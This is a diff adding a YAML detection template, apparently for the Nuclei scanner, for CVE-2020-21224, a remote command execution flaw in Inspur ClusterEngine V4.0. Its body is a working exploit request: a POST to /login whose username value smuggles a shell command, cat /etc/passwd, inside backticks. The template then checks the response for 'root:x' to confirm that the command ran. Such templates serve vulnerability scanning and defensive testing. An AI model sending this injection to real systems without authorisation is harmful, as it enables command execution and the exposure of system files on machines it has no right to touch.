@@ -1,0 +1,25 @@
+id: CVE-2020-21224
+
+info:
+  name: CVE-2020-21224
+  author: wintrysec
+  severity: critical
+  description: 浪潮ClusterEngineV4.0 远程命令执行漏洞
+  reference: https://github.com/DawnFlame/POChouse
+  tags: CVE-2020-21224
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'op=login&username=peiqi`$(cat /etc/passwd)`'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x"
+      - type: status
+        status:
+          - 200
